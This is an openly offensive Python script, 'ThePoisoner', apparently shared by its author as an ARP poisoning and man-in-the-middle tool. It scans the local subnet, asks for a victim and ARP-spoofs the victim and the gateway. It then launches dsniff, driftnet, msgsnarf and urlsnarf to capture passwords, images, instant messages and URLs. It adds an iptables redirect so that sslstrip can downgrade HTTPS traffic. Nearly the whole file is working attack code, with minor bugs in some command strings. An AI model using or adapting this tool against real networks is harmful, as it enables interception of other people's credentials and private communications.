#!/usr/bin/env python
# Imports Section! Some of these are probably unneeded

# sudo apt-get install dsniff (pour arpspoof)

# http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.9.tar.gz
# tar zxvf sslstrip-0.9.tar.gz
# cd sslstrip-0.9
# (optional) sudo python ./setup.py install

import os
import sys
import socket
import struct
import time
import subprocess
from scapy.all import * # this may need to be changed depending on your system...
from commands import getoutput
# End of Imports Section
# Edit these values... Eventually these will autoconfigure... I advise leaving them be cos they just fucking work.

#conf.verb=0 # I had to comment this out to get the ARP scanner to work. I apologise for any annoying messages it gives :/
# It is not advised to edit beyond this point

# Function: amiroot()
def amiroot():
    if os.geteuid() != 0: # am i root?!?!?!?!
        print("[-] You are not root... Sudo may be of some assistance!")
        print("[i] SCAPY and other tools REQUIRE root! This is why.")
        sys.exit(1)
    else:
        print("[+] You are uid=0, we can continue...")
        pass

# Function: Banner - my badass ASCII banner!
def banner():
    print(" _____ _         ______      _                           ")
    print("|_   _| |        | ___ \    (_)                          ")
    print("  | | | |__   ___| |_/ /___  _ ___  ___  _ __   ___ _ __ ")
    print("  | | | '_ \ / _ \  __// _ \| / __|/ _ \| '_ \ / _ \ '__|")
    print("  | | | | | |  __/ |  | (_) | \__ \ (_) | | | |  __/ |   ")
    print("  \_/ |_| |_|\___\_|   \___/|_|___/\___/|_| |_|\___|_| ")
    print("")
    print("      ARP Poisoning and MITM Utility by infodox.")
    print("            http://blog.infodox.co.cc ")
    print(" Report bugs to me, I am in the IRC chan #intern0t on Freenode")
    print("                  Revision 12... I think")

# Function: check_airmon()
def check_airmon():

    if getoutput("which airmon-ng"): print("[*] Airmon-ng is installed! This is fine...")
    else:
        print("[-] Airmon-ng not found, quitting!")
	sys.exit(1)

# Function: get_ifaces() This works in 3
def get_ifaces():
        airmon = os.popen("airmon-ng") # Runs airmon-ng
        ifacelst = airmon.readlines() # reads it
        li=0
        for line in ifacelst:
                line = line.replace("Interface\tChipset\t\tDriver","") #parsing lines
                line = line.strip() # stripping the data out
                inum = li + 1 # more data finding
                if line:
                        line = line.split("\t\t") # splitting again
                        print (line[0]) # prints interface
                        ifaces = line[0]
                        return ifaces

# Function: ip_forwarding() 
def ip_forwarding():
    try:
        os.popen("echo 1 > /proc/sys/net/ipv4/ip_forward") # Enable IP forwarding
        ipout = open("/proc/sys/net/ipv4/ip_forward" , "r").read() # Checks is it enabled
        time.sleep(1)
        if ipout[0] == '1': # validates enabled...
            print("[+] IP forwarding enabled")
        else:
            print("[-] Something fucked up, forwarding not enabled!")
            ipout.close() # closes the file...
    except Exception:
        pass

# Function: Get Gateway
def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh: # Opens the /proc/net/route interface
        for line in fh:
            fields = line.strip().split() # splitting shit
            if fields[1] != '00000000' or not int(fields[3], 16) & 2: # checking data
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))) # spits out the gateway!

# Function: makerange(), gets gateway, returns the range
def makerange(gwaddr):
    SIP=gwaddr.split('.') # Splits the IP address of the gateway
    iprange = SIP[0] + '.' + SIP[1] + '.' + SIP[2] + '.0/24' # makes a new one that is the range
    return iprange

# Function: Arppoison
def arppoison(iface, target, gwaddr): # This function will soon be depracated once I get SCAPY to do it for me.
    print("[+] Preparing the ARP Poisoning Suite")
    print("[*] Targetted gateway is " + gwaddr) # Verbosity
    print("[*] Targetted user is " + target) # More verbosity
    print("[*] Interface in use is " + iface) # Even more verbosity :D
    os.popen("arpspoof -i " + iface + " -t " + target + gwaddr + " & >/dev/null") # I dont like this
    print("[+] Poisoning them bastards")
    os.popen("arpspoof -i " + iface + " -t " + gwaddr + target + "  & >/dev/null") # Or this. It needs some SCAPY.

# Function: tcpdump
def tcpdumper(iface):
    choose = raw_input("[?] Launch TCPDump to sniff raw data to a file? (y/n) ")
    if choose == "n":
        print("[+] TCPdump not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching TCPDump in background!")
            os.popen("gnome-terminal -e 'sudo tcpdump -i " + iface + " -w output.cap &'") # runs it in an gnome-terminal... 
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: Dsniff
def launch_dsniff(iface):
    choose = raw_input("[?] Launch DSNIFF to sniff passwords? (y/n) ")
    if choose == "n":
        print("[+] dsniff not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching Dsniff in background!")
            os.popen("gnome-terminal -e 'sudo dsniff -c -m -i " + iface + " &'")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: Driftnet
def launch_driftnet(iface):
    choose = raw_input("[?] Launch Driftnet to sniff images? (y/n) ")
    if choose == "n":
        print("[+] Driftnet not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching Driftnet in background!")
            os.popen("gnome-terminal -e 'sudo driftnet -i " + iface + "'")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: MsgSnarf
def launch_msgsnarf(iface):
    choose = raw_input("[?] Launch MsgSnarf to sniff instant messages? (y/n) ")
    if choose == "n":
        print("[+] MsgSnarf not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching MsgSnarf in background!")
            os.popen("gnome-terminal -e 'sudo msgsnarf -i " + iface + " &'")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: UrlSnarf
def launch_urlsnarf(iface):
    choose = raw_input("[?] Launch URLSnarf to sniff URL's? (y/n) ")
    if choose == "n":
        print("[+] URLSnarf not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Launching URLSarf in background!")
            os.popen("gnome-terminal -e 'sudo urlsnarf -i " + iface + " &'")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# Function: SSLSTRIP
def launch_sslstrip():
    choose = raw_input("[?] Launch SSLStrip to sniff SSL data? (y/n) ")
    if choose == "n":
        print("[+] SSLStrip not launched!")
        pass
    elif choose == "y":
        try:
            print("[+] Setting IPTables NAT rulesets")
            subprocess.call('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000', shell=True)
            print("[+] Launching SSLStrip in background!")
            os.popen("gnome-terminal -e 'sudo sslstrip -l 10000 -a &'")
        except Exception:
            print("Something Broke!")
            sys.exit(1)

# THIS PART DOES SHIT!
banner()
amiroot()
check_airmon()
print("[*] These are the interfaces available to you")
get_ifaces()
iface = raw_input("what interface are you using (eg: wlan0): ") # Sets the interface to fuck with...
print("[*] Using interface " + iface)
ip_forwarding()
gwaddr = get_default_gateway_linux()
print("[*] Gateway address: " + gwaddr)
scanrange = makerange(gwaddr)
print("[+] Range to scan is: " + scanrange)
print(arping(scanrange)) # should be a far faster scanner. If it breaks just uncomment the one above :)
#arpscan(scanrange)
target = raw_input("Please Select a Target: ")
arppoison(iface, target, gwaddr) # The arppoison function is due for replacement
tcpdumper(iface)
launch_dsniff(iface)
launch_driftnet(iface)
launch_msgsnarf(iface)
launch_urlsnarf(iface)
launch_sslstrip()
